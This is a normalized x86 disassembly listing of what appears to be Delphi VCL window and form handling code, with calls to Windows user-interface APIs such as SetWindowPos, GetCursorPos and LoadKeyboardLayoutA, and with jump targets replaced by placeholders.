mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4345d4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_438b7c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453f40
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452428
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_439a14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_439af3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439afa
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43b290
mov dl [ ebx + 0x184 ]
call sub_43fed0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4523a0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407b10
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4521a0
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4521a0
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4521a0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_439b00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439b8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439b91
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4523a0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407b10
test eax eax
je r-xdata
mov eax ebx
call sub_43b290
mov dl 0x1
call sub_43feb4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_439bec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4125b0
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_435c5c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_439c3c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_439c70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_4032f4
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_4032f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_439cb0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_435c5c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_439d08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a1e4
mov edx [ r-xdata ]
call sub_4032a8
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_439d40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4139f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439d64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b290
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_439dc0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_439d2c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4139f4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_439e00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405508
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405508
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_439e6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_439f14
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f1b
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43273c
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4030f8
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4054f0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_4032f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405508
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ edi + 0x178 ] eax
sub_439f24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_437b28
xor edx edx
push ebp
push sub_439fe6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_4032f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fed
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_439fed
mov eax [ ebp - 0x4 ]
call sub_44b71c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_434cf0
sub_43a038
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403040
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43691c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43a0a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_434cf0
sub_43a0bc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43a0e4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44b71c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b624
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_4032f4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a0e4
test al al
jne r-xdata
sub_43a14c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a0e4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c3dc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a178
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a0e4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c3dc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a1a4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43a1cc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44b71c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b624
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4032f4
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a1cc
test al al
jne r-xdata
sub_43a234
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a1cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a254
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a1cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a294
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44b71c
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4032f4
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a294
test al al
jne r-xdata
sub_43a2f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a294
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_435c5c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43a318
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43a3c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43a318
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44b71c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_435c5c
test eax eax
jne r-xdata
sub_43a470
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a490
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a4c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_438f10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a4e4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43a534
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43a558
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_433d5c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_437fc0
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_437f84
mov dl [ esp ]
mov si 0xffd1
call sub_4032f4
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43a5b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4032f4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a5d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4032f4
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a60c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436730
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_438020
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_438830
sub_43a644
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4032f4
pop esi
pop ebx
retn
mov eax ebx
call sub_4350ec
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404374
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404374
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43a6c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438c10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_436804
sub_43a724
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_438984
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_437d80
pop ebx
retn
sub_43a754
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43a77c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_437d80
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43a7ec
push ebx
mov ebx eax
mov eax ebx
call sub_436670
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_438020
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41cd3c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_435c5c
sub_43a828
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43333c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43b290
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_435c5c
sub_43a868
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b594
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b290
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a8a8
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_438020
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43b198
sub_43a8e8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43b3d0
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43b3d0
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43a948
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4356b8
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4345d4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_438b7c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43a9b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4367a8
mov edx esi
mov eax ebx
call sub_437fe0
pop esi
pop ebx
retn
sub_43a9d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_4319cc
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44b71c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4032f4
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4032f4
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4032f4
test al al
jne r-xdata
sub_43aa68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c3dc
mov edx esi
mov eax ebx
call sub_43a9d4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_435c5c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_435c5c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_435c5c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44b71c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_435c5c
test eax eax
jne r-xdata
jmp r-xdata
sub_43ab4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_435c5c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43aba0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
